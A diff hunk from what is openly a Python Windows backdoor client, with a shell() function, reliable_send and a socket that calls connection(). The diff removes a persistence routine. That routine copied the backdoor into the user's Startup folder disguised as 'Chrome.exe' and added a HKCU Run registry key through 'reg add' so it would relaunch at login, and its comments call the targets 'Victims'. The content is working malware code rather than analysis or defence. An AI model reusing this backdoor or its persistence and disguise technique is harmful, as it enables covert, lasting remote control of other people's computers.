@@ -151,23 +151,6 @@ def shell():
             result = result.decode()
             reliable_send(result)
 
-# ============= Gaining persistency
-# A common C:\Users\USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Programs\Chrome.exe ;)
-location = os.environ["appdata"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Chrome.exe"
-
-# If 'location' does NOT exist, it's 1st time running this Backdoor client
-
-if not os.path.exists(location):
-#     # Performing copying action of our Backdoor.exe to User's /AppData
-      shutil.copyfile(sys.executable, location)
-#     # Allow users to proactively connect to our backdoor server
-#     # whenever they login to their machines
-#     #
-#     # Appending machine startup .exe permissions to Victims' Windows regkey at
-#     # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
-#     # /v = Name; /t = Type; /d = Data
-      subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Chrome.exe /t REG_SZ /d "' + location + '"', shell=True)
-else:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # Bind socket => connection() => shell() => Call connection()
-    connection()
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# Bind socket => connection() => shell() => Call connection()
+connection()
